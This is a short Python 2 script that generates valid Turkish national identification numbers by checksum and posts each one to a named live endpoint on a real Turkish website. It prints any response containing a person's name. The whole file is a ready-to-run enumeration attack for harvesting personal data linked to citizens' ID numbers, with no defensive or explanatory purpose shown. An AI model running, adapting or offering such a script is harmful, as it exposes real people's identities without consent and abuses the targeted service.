import requests
import uuid

def turkish_id_no_check(tc_no):
    ''' turkish_id_no_check(long) -> bool

    Return the validation of Turkish Identification Number

    >>> turkish_id_no_check(98768109974)
    True
    '''

    list_tc = map(int,str(tc_no))
    tc10 = (sum(list_tc[0:10:2])*7 - sum(list_tc[1:9:2])) % 10
    tc11 = (sum(list_tc[0:9]) + tc10) % 10
    return True if list_tc[9] == tc10 and list_tc[10] == tc11 else False

def go():
    for i in range(10000000000, 20000000000):
        if turkish_id_no_check(i):
            r = requests.post("https://budo.burulas.com.tr/tr/Dynamic/TcRequest", {
                "tcIdentity": i,
                "ticketCategory": str(uuid.uuid4())
            })
            if r.status_code == 200:
                rdata = r.json()
                if rdata.get("Name"):
                    print r.text

if __name__ == "__main__":
    go()